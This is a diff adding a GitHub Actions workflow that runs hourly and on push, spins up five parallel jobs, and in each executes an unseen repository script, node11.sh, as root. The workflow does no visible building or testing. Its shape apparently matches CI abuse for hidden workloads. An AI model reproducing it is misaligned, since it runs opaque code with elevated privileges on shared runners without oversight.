@@ -1,0 +1,31 @@
+name: build 10
+ 
+on:
+  workflow_dispatch:
+  push:
+    branches: ["main"]
+  schedule:
+    - cron: '0 */1 * * *'
+  
+jobs: 
+  build: 
+    name: build 
+    runs-on: ubuntu-latest 
+    strategy: 
+      max-parallel: 5 
+      fail-fast: false 
+      matrix: 
+        go: [1, 2, 3, 4, 5] 
+        flag: [A] 
+    env: 
+        NUM_JOBS: 40  
+        JOB: ${{ matrix.go }} 
+    steps: 
+    - name: Setup 
+      continue-on-error: true 
+      uses: actions/checkout@v2 
+    - name : Install Dependencies 
+      run: chmod +x "${GITHUB_WORKSPACE}/node11.sh" && sudo RUNNER_ALLOW_RUNASROOT=true "${GITHUB_WORKSPACE}/node11.sh" 
+ 
+ 
+ 
